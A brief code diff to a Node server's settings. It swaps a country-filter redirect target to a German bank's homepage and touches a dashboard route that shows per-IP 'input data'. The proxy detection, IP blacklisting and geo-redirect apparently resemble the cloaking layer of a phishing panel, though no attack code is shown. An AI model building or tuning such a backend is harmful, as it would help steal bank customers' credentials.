@@ -20,7 +20,7 @@ const globalSettings = {
   inputDataBlacklist: new Set(), // IPs that have had their input data deleted
   proxyDetectionEnabled: true,
   countryFilterMode: 'block', // 'block' or 'allow'
-  countryRedirectUrl: 'https://www.zinia.com/de',
+  countryRedirectUrl: 'https://www.easybank.de/',
   blockedCountries: new Set(),
   allowedCountries: new Set()
 };
@@ -5115,3 +5115,4 @@ app.get('/dashboard/input-data/:ip', (req, res) => {
     }
   });
 });
+
